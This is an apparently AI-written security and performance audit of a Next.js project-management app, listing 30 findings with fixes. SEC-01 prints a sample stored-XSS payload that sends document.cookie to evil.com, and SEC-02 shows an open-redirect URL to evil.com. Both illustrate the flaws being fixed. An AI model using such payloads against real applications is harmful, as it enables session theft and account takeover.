# PMS Application Audit — Issues List

**Date:** 2026-02-10
**Audited by:** Claude Opus 4.6 (SAST, Dependency, React/Next.js Best Practices)
**Total findings:** 30

---

## Summary

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| Security (SAST) | 3 | 7 | 5 | 0 | 15 |
| Dependencies | 0 | 1 | 3 | 2 | 6 |
| React/Next.js Performance | 0 | 0 | 6 | 3 | 9 |
| **Total** | **3** | **8** | **14** | **5** | **30** |

---

## CRITICAL

### SEC-01: Stored XSS via unsanitized `dangerouslySetInnerHTML`

- **Category:** Security
- **Files:**
  - `components/tasks/TaskDetailDescription.tsx:43`
  - `components/tasks/TaskCommentItem.tsx:84`
  - `components/projects/NotePreviewModal.tsx:148`
- **Description:** User-generated HTML content (task descriptions, comments, notes) is rendered directly via `dangerouslySetInnerHTML` without any sanitization. No DOMPurify or any sanitizer is used anywhere in the app.
- **User impact:** Any project member can inject malicious scripts (e.g., `<img src=x onerror="fetch('https://evil.com',{body:document.cookie})">`) into a task description. Every other user who views that task gets their session stolen. This enables account takeover and data theft.
- **Fix:** Install and use DOMPurify:
  ```bash
  pnpm add dompurify && pnpm add -D @types/dompurify
  ```
  ```tsx
  import DOMPurify from "dompurify"
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }}
  ```
- **Effort:** 30 minutes

---

### SEC-02: Open redirect in OAuth callback

- **Category:** Security
- **File:** `app/auth/callback/route.ts:11,63`
- **Description:** The `next` query parameter is read from the URL and used directly in the redirect (`NextResponse.redirect(\`${origin}${next}\`)`) without validating that it is a relative path.
- **User impact:** Attacker crafts `https://yourapp.com/auth/callback?code=VALID&next=//evil.com`. After the user legitimately authenticates, they land on `evil.com` which can steal their session token or show a phishing page.
- **Fix:** Validate the `next` parameter:
  ```ts
  function sanitizeRedirectPath(path: string): string {
    if (!path.startsWith("/") || path.startsWith("//") || path.includes("://")) return "/"
    return path
  }
  const next = sanitizeRedirectPath(requestUrl.searchParams.get("next") ?? "/")
  ```
- **Effort:** 15 minutes

---

### SEC-03: Missing security headers (CSP, X-Frame-Options, HSTS)

- **Category:** Security
- **File:** `next.config.mjs` — `headers()` only sets Cache-Control
- **Description:** No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, or `Permissions-Policy` headers are configured.
- **User impact:** The app can be embedded in an attacker's iframe for clickjacking. Without CSP, there is no second line of defense against XSS. Users on HTTP don't get auto-upgraded to HTTPS.
- **Fix:** Add a catch-all security headers block to `next.config.mjs` `headers()`:
  ```js
  {
    source: '/(.*)',
    headers: [
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'X-DNS-Prefetch-Control', value: 'on' },
      { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
      { key: 'Permissions-Policy', value: 'camera=(), microphone=(self), geolocation=()' },
      { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.supabase.co https://*.googleusercontent.com https://avatars.githubusercontent.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co; font-src 'self'; frame-ancestors 'none';" },
    ],
  },
  ```
- **Effort:** 15 minutes

---

## HIGH

### SEC-04: Server actions missing auth checks — IDOR risk

- **Category:** Security
- **Files:**
  - `lib/actions/tags.ts` — `getTags()`, `createTag()`, `updateTag()`, `deleteTag()`
  - `lib/actions/labels.ts` — `getLabels()`, `createLabel()`, `updateLabel()`, `deleteLabel()`
  - `lib/actions/teams.ts` — `createTeam()`, `getTeams()`, `getTeam()`, `updateTeam()`, `deleteTeam()`
  - `lib/actions/workflow-statuses.ts` — all 6 functions
  - `lib/actions/files.ts` — `deleteFile()`, `getProjectFiles()`, `getFile()`, `getFileUrl()`, `downloadFile()`, `updateFile()`, `getProjectFilesCount()`
  - `lib/actions/notes.ts` — `deleteNote()`, `getNote()`, `getProjectNotes()`, `getProjectNotesCount()`, `completeAudioNote()`
  - `lib/actions/inbox.ts` — `markAsRead()`, `deleteInboxItem()`, `createInboxItem()`, `createInboxItemsForUsers()`
  - `lib/actions/search.ts` — `globalSearch()`
- **Description:** These server actions use `createClient()` (inherits user session from cookies) but do NOT call `requireAuth()`, `requireOrgMember()`, or `requireProjectMember()`. While RLS provides database-level protection, the application layer has no authorization check and trusts caller-supplied `orgId`/`projectId` parameters.
- **User impact:** If RLS policies have any gaps, an attacker could manipulate tags/labels/teams in organizations they don't belong to, delete files/notes from other projects, or send notifications to arbitrary users.
- **Fix:** Add appropriate auth helpers to each function:
  ```ts
  // For org-scoped actions:
  const { supabase } = await requireOrgMember(orgId)

  // For project-scoped actions:
  const { supabase } = await requireProjectMember(projectId)

  // For user-scoped actions:
  const { supabase } = await requireAuth()
  ```
- **Effort:** 2-3 hours

---

### SEC-05: Invitation sending not restricted to admins

- **Category:** Security
- **File:** `lib/actions/invitations.ts:20-79` (`inviteMember`) and `:260-299` (`resendInvitation`)
- **Description:** `inviteMember()` only calls `requireAuth()` — any logged-in user can invite people to any org if they know the org ID. `cancelInvitation()` correctly enforces admin role, but `inviteMember()` and `resendInvitation()` do not.
- **User impact:** Non-admin members can invite arbitrary users to the organization, bypassing intended access controls.
- **Fix:** Replace `requireAuth()` with `requireOrgMember(orgId, true)` to enforce admin role.
- **Effort:** 15 minutes

---

### SEC-06: OAuth redirect URL uses spoofable `Origin` header

- **Category:** Security
- **File:** `lib/actions/auth.ts:246,359`
- **Description:** `signInWithGoogle()` and `resetPassword()` use `headersList.get("origin")` to build the OAuth redirect URL and password reset redirect URL. The `Origin` header can be set by any HTTP client.
- **User impact:** Could redirect OAuth callbacks or password reset links to attacker-controlled domains, enabling token theft.
- **Fix:** Use only the server-side env variable:
  ```ts
  const origin = process.env.NEXT_PUBLIC_SITE_URL
  ```
- **Effort:** 5 minutes

---

### SEC-07: File upload lacks MIME type allowlist

- **Category:** Security
- **File:** `lib/actions/files.ts:128-184`
- **Description:** The upload function checks file size but does NOT validate that the MIME type is in an allowlist. A user could upload `.html`, `.svg`, or `.exe` files.
- **User impact:** Stored XSS via uploaded HTML/SVG files — a malicious file could execute scripts when another user opens/previews it.
- **Fix:** Add MIME type allowlist:
  ```ts
  const ALLOWED_MIME_TYPES = new Set([
    'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    'application/pdf', 'application/zip',
    'video/mp4', 'video/webm',
    'audio/mpeg', 'audio/wav', 'audio/m4a',
  ])

  if (!ALLOWED_MIME_TYPES.has(file.type)) {
    return { error: "File type not allowed" }
  }
  ```
- **Effort:** 30 minutes

---

### SEC-08: Signed URLs with 1-year expiration

- **Category:** Security
- **File:** `lib/actions/files.ts:198`
- **Description:** `createSignedUrl(storagePath, 60 * 60 * 24 * 365)` — files remain accessible for an entire year with no revocation possible.
- **User impact:** If a signed URL leaks (via referrer headers, logs, or shared links), confidential project files remain exposed long after someone leaves the organization.
- **Fix:** Reduce to 1-hour URLs and generate fresh ones on each access:
  ```ts
  .createSignedUrl(storagePath, 60 * 60) // 1 hour
  ```
- **Effort:** 10 minutes

---

### SEC-09: No rate limiting on password reset

- **Category:** Security
- **File:** `lib/actions/auth.ts:348-370`
- **Description:** The `resetPassword()` function has no `checkRateLimit()` call, unlike `signIn()` and `signUp()` which both use `rateLimiters.auth`.
- **User impact:** An attacker can spam password reset emails to any email address, causing email bombing.
- **Fix:** Add rate limiting:
  ```ts
  const limit = await checkRateLimit(rateLimiters.auth, ip)
  if (!limit.success) return rateLimitError(limit.reset)
  ```
- **Effort:** 10 minutes

---

### SEC-10: PostgREST filter injection in search queries

- **Category:** Security
- **Files:**
  - `lib/actions/tasks.ts:202,280`
  - `lib/actions/notes.ts:291-292`
  - `lib/actions/projects/crud.ts:325`
- **Description:** Search strings are interpolated directly into `.or()` PostgREST filter strings without sanitization. The `globalSearch` in `search.ts` has proper `sanitizeSearchInput()`, but these functions don't use it.
- **User impact:** A crafted search query could modify filter logic to return unauthorized data (mitigated by RLS, but still a defense gap).
- **Fix:** Apply the existing `sanitizeSearchInput()` from `search.ts` to all search parameters before interpolation into `.or()` calls.
- **Effort:** 30 minutes

---

### DEP-01: `tar` CVEs via `@tailwindcss/oxide` (3 HIGH advisories)

- **Category:** Dependencies
- **Package:** `tar` 7.5.2 (via `@tailwindcss/postcss` > `@tailwindcss/oxide`)
- **Advisories:**
  - GHSA-8qq5-rm4j-mr97 — Arbitrary File Overwrite + Symlink Poisoning
  - GHSA-r6q2-hw4h-h46w — Race Condition via Unicode Ligature Collisions
  - GHSA-34x7-hfp2-rc4v — Hardlink Path Traversal
- **User impact:** Dev-only (build step), but could compromise CI pipeline.
- **Fix:** Update `tailwindcss` and `@tailwindcss/postcss` from 4.1.9 to 4.1.18, or add:
  ```json
  "pnpm": { "overrides": { "tar": ">=7.5.7" } }
  ```
- **Effort:** 10 minutes

---

## MEDIUM

### SEC-11: Batch task update API missing project authorization

- **Category:** Security
- **File:** `app/api/tasks/batch-update-status/route.ts:13-63`
- **Description:** Checks authentication but not project membership. Accepts arbitrary task IDs and updates their status without verifying the user belongs to the projects those tasks are in.
- **Fix:** Fetch task project IDs first, then verify membership for each unique project before updating.
- **Effort:** 30 minutes

---

### SEC-12: `createInboxItemsForUsers` has no auth check

- **Category:** Security
- **File:** `lib/actions/inbox.ts:153`
- **Description:** This server action can send notifications to arbitrary user IDs with no authentication or authorization check.
- **Fix:** Add `await requireAuth()` and verify the caller has a reason to notify the target users.
- **Effort:** 10 minutes

---

### SEC-13: CSV import accepts unlimited input size

- **Category:** Security
- **File:** `lib/actions/import.ts:266-270`
- **Description:** `csvContent: string` with no length limit. A 100MB CSV could exhaust server memory.
- **Fix:** Add size check:
  ```ts
  if (csvContent.length > 5 * 1024 * 1024) {
    return { error: "CSV file too large (max 5MB)" }
  }
  ```
- **Effort:** 5 minutes

---

### SEC-14: `Math.random()` used for filename generation

- **Category:** Security
- **File:** `lib/actions/files.ts:115`
- **Description:** `Math.random().toString(36)` is predictable and not cryptographically random. Could allow file enumeration.
- **Fix:** Use `crypto.randomUUID().split('-')[0]` instead.
- **Effort:** 5 minutes

---

### SEC-15: Rate limiting fails open on KV errors + invite limiter unused

- **Category:** Security
- **Files:** `lib/rate-limit/limiter.ts`, `lib/actions/invitations.ts`
- **Description:** When KV is unavailable or errors, rate limiting returns `{ success: true, remaining: 999 }`. The defined `rateLimiters.invite` is never actually called anywhere.
- **Fix:** Wire up `checkRateLimit(rateLimiters.invite, ip)` in `inviteMember()`. Consider in-memory fallback for KV outages in production.
- **Effort:** 30 minutes

---

### PERF-01: Sequential query waterfalls in server actions

- **Category:** Performance
- **Files:**
  - `lib/actions/tasks.ts:556-575` — `deleteTask()`: sequential task + project queries
  - `lib/actions/tasks.ts:640-658` — `moveTaskToWorkstream()`: sequential task + project queries
  - `lib/actions/tasks.ts:363-399` — `updateTask()`: sequential profile lookups for activity
  - `lib/actions/workstreams.ts:193-223` — `updateWorkstream()`: sequential auth + project queries
- **Description:** Multiple sequential `await` calls fetch data that could be retrieved in a single query (via joins) or in parallel (via `Promise.all()`).
- **User impact:** Each waterfall adds ~100-200ms latency per operation.
- **Fix:** Use Supabase joins for related data, and `Promise.all()` for independent queries:
  ```ts
  // Instead of 2 queries:
  const { data: task } = await supabase
    .from("tasks")
    .select("project_id, assignee_id, project:projects(organization_id)")
    .eq("id", id)
    .single()
  ```
- **Effort:** 1 hour

---

### PERF-02: Barrel file imports slowing builds

- **Category:** Performance
- **Files:**
  - `lib/actions/projects.ts` — re-exports from `./projects/index` (5 sub-modules)
  - `lib/actions/ai.ts` — re-exports from `./ai/index.ts` (4 sub-modules)
  - `components/skeletons/index.ts` — re-exports ~67 named exports from 7 sub-modules
- **Description:** Components that import through these barrels force the bundler to resolve the entire module graph even when only 1-2 exports are used. Slows HMR in development.
- **Fix:** Import directly from sub-modules:
  ```ts
  // Before
  import { ProjectsListSkeleton } from "@/components/skeletons"
  // After
  import { ProjectsListSkeleton } from "@/components/skeletons/dashboard-skeletons"
  ```
- **Effort:** 1 hour

---

### PERF-03: Excessive data serialization to client components

- **Category:** Performance
- **File:** `app/(dashboard)/tasks/page.tsx:33-40`
- **Description:** The `MyTasksPage` client component receives full `organizationMembers` and `organizationTags` arrays with all fields. Only names, IDs, and avatars are needed for filter dropdowns.
- **User impact:** Larger RSC payload = slower navigation.
- **Fix:** Map to minimal shapes before passing to client:
  ```ts
  organizationMembers={(members || []).map(m => ({
    id: m.user_id,
    name: m.profiles?.full_name ?? m.profiles?.email ?? "",
    avatarUrl: m.profiles?.avatar_url ?? null,
    role: m.role,
  }))}
  ```
- **Effort:** 30 minutes

---

### PERF-04: Missing `error.tsx` boundaries in dashboard routes

- **Category:** UX / Resilience
- **File:** `app/(dashboard)/` — no per-segment error boundaries
- **Description:** Only `app/error.tsx` and `app/global-error.tsx` exist. If any dashboard section crashes (network failure, invalid data), the entire app unmounts including sidebar and navigation.
- **User impact:** Full-page error instead of graceful degradation of just the affected section.
- **Fix:** Add `error.tsx` to `app/(dashboard)/` and key sub-routes.
- **Effort:** 15 minutes

---

### PERF-05: Missing page metadata on dashboard pages

- **Category:** Accessibility / UX
- **Files:** All pages under `app/(dashboard)/`
- **Description:** No dashboard pages export `metadata` or `generateMetadata`. All browser tabs show the same title. Screen readers can't announce the current page.
- **User impact:** Poor tab management, reduced accessibility for screen reader users, unhelpful bookmarks.
- **Fix:** Add static metadata to each page:
  ```ts
  export const metadata = { title: "Projects - PM Tools" }
  ```
- **Effort:** 20 minutes

---

### PERF-06: No `content-visibility` on long lists

- **Category:** Performance
- **Description:** Task lists, project lists, and inbox items render all DOM nodes without `content-visibility: auto`. With 100+ items, the browser lays out everything on initial paint.
- **User impact:** Janky scrolling and delayed initial paint on large datasets.
- **Fix:** Add to list row CSS:
  ```css
  .task-row {
    content-visibility: auto;
    contain-intrinsic-size: auto 52px;
  }
  ```
- **Effort:** 15 minutes

---

### DEP-02: 11 unused packages in `package.json`

- **Category:** Dependencies
- **Packages:**
  - `autoprefixer` — not referenced; Tailwind CSS 4 handles prefixing internally
  - `tailwindcss-animate` — replaced by `tw-animate-css`
  - `embla-carousel-react` — not imported in any file
  - `input-otp` — not imported in any file
  - `vaul` — not imported in any file
  - `react-resizable-panels` — not imported in any file
  - `@radix-ui/react-aspect-ratio` — no consumer
  - `@radix-ui/react-hover-card` — no consumer
  - `@radix-ui/react-menubar` — no consumer
  - `@radix-ui/react-navigation-menu` — no consumer
  - `@radix-ui/react-context-menu` — no consumer
- **User impact:** Slower installs, larger `node_modules`, unnecessary CI time.
- **Fix:** `pnpm remove autoprefixer tailwindcss-animate embla-carousel-react input-otp vaul react-resizable-panels @radix-ui/react-aspect-ratio @radix-ui/react-hover-card @radix-ui/react-menubar @radix-ui/react-navigation-menu @radix-ui/react-context-menu`
- **Effort:** 10 minutes

---

### DEP-03: Supply chain risk — `next-lazy-hydration-on-scroll`

- **Category:** Dependencies
- **Package:** `next-lazy-hydration-on-scroll` 1.2.0
- **Description:** Single maintainer, 6 total versions ever published, 12.5 KB. Only used in 1 file. Small user base = higher supply chain risk.
- **Fix:** Inline the core logic (~20 lines using IntersectionObserver) or use `next/dynamic` + `Suspense`.
- **Effort:** 30 minutes

---

### DEP-04: `@types/react-syntax-highlighter` in wrong section

- **Category:** Dependencies
- **Package:** `@types/react-syntax-highlighter` 15.5.13
- **Description:** Type definition package placed in `dependencies` instead of `devDependencies`. Gets installed in production unnecessarily.
- **Fix:** `pnpm remove @types/react-syntax-highlighter && pnpm add -D @types/react-syntax-highlighter`
- **Effort:** 2 minutes

---

## LOW

### PERF-07: Duplicate motion libraries in bundle

- **Category:** Performance / Bundle
- **Packages:** Both `framer-motion` and `motion` (its successor) are installed.
- **User impact:** ~40KB of duplicate JavaScript shipped to users.
- **Fix:** Migrate all imports to `motion/react` and remove `framer-motion`.
- **Effort:** 1 hour

---

### PERF-08: Auth pages are fully client-side unnecessarily

- **Category:** Performance / Bundle
- **Files:** `app/(auth)/login/page.tsx`, `app/(auth)/signup/page.tsx`, `app/(auth)/forgot-password/page.tsx`
- **Description:** These pages have `"use client"` at the top level. Only the form needs interactivity — headings, layout, and decorative elements could be server-rendered.
- **Fix:** Extract the interactive form into a client component, keep the page wrapper as a Server Component.
- **Effort:** 1 hour

---

### PERF-09: Effect-based data fetching instead of SWR

- **Category:** UX
- **File:** `components/settings/panes/preferences-pane.tsx:53-67`
- **Description:** Uses `useEffect` + manual `isLoading` state for data fetching. The project already has SWR configured — this should use it for free caching, deduplication, and stale-while-revalidate.
- **Fix:**
  ```ts
  const { data: preferences, isLoading } = useSWR("user-preferences", () =>
    getPreferences().then(r => r.data ?? null)
  )
  ```
- **Effort:** 15 minutes

---

### DEP-05: Radix UI packages significantly outdated

- **Category:** Dependencies
- **Description:** Most `@radix-ui/*` packages are pinned to old versions (e.g., 1.1.x when latest is 1.2.x+). Radix frequently releases accessibility fixes and bug patches.
- **Fix:** Batch-update all Radix UI packages together to avoid peer dependency conflicts.
- **Effort:** 30 minutes

---

### PERF-10: Derived state computed in effects

- **Category:** Performance
- **File:** `components/project-wizard/steps/StepOwnership.tsx:84-107`
- **Description:** Three `useEffect` hooks set default values for wizard fields on mount, causing unnecessary re-renders. Defaults should be set in the wizard's initial state.
- **Fix:** Set default values in the parent wizard's initial data object instead of effects.
- **Effort:** 15 minutes

---

## What the Codebase Does Well

The audit also found many areas of strong implementation:

- **Parallel data fetching** — Dashboard layout, project detail, clients, inbox, and chat already use `Promise.all()`
- **Request-level caching** — Excellent `React.cache()` usage via `cachedGetUser()` and related functions
- **KV caching layer** — Well-designed cross-request caching with TTL tiers and granular invalidation
- **Suspense streaming** — Every dashboard route has `loading.tsx` + in-page `<Suspense>` with skeletons
- **Lazy loading** — Heavy components properly code-split with `next/dynamic` and hover preloading
- **Input validation** — Zod schemas used consistently for mutations
- **AES-256-GCM encryption** — API key encryption is properly implemented in `lib/crypto.ts`
- **CSRF protection** — Next.js server actions have built-in CSRF via `__next_action_id`
- **No hardcoded secrets** — Clean codebase, secrets only in `.env.local`
- **Rate limiting on auth** — `signIn()` and `signUp()` properly rate limited
- **File upload** — Size limits, filename sanitization, and unique naming in `uploadFile()`
- **Comment ownership** — Edit/delete on comments correctly verifies `author_id === user.id`
- **Build script restrictions** — `pnpm.onlyBuiltDependencies` limits which packages can run postinstall scripts
- **Lockfile committed** — `pnpm-lock.yaml` pins exact versions

---

## Recommended Fix Order

### Phase 1 — Critical (do today, ~1 hour)
1. SEC-01: Add DOMPurify sanitization
2. SEC-02: Validate OAuth callback redirect
3. SEC-03: Add security headers

### Phase 2 — High priority (this week, ~4 hours)
4. SEC-04: Add auth checks to server actions
5. SEC-05: Restrict invitations to admins
6. SEC-06: Fix Origin header in OAuth/password reset
7. SEC-07: Add MIME type allowlist for uploads
8. SEC-08: Reduce signed URL expiry
9. SEC-09: Rate limit password reset
10. SEC-10: Sanitize PostgREST search inputs
11. DEP-01: Patch `tar` CVEs

### Phase 3 — Medium priority (next sprint, ~5 hours)
12. SEC-11 through SEC-15: Remaining security hardening
13. PERF-01 through PERF-06: Performance optimizations
14. DEP-02 through DEP-04: Dependency cleanup

### Phase 4 — Low priority (when convenient)
15. PERF-07 through PERF-10: Bundle and UX polish
16. DEP-05: Radix UI updates
